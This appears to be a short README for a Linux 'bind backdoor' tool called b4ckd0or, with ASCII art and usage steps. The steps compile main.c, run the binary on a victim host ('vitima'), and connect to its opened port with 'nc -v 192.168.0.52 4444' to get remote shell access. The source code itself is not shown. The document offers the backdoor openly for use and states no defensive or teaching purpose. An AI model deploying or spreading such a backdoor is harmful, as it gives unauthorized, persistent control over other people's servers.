# b4ckd0or
            /\
           / \\ /\
      /\  /\/  \\V  \/\
     / \\/ // \\\\\ \\ \/\
    //  /   Medn1c    \/ \\
   
Simple bind backdoor destined for linux servers
Use:

    root@medn1c:~# gcc main.c -o backdoor
    root@vitima:~# ./backdoor
    root@medn1c:~# nc -v 192.168.0.52 4444
    
